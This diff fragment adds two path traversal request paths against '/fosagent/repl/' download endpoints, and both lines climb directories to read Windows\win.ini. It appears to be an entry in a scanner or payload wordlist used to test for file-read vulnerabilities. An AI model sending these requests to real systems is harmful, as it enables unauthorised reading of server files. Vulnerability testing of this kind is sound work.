@@ -1,0 +1,2 @@
+/fosagent/repl/download-file?basedir=4&filepath=..\..\Windows\win.ini
+/fosagent/repl/download-snapshot?name=..\..\..\..\..\..\..\Windows\win.ini
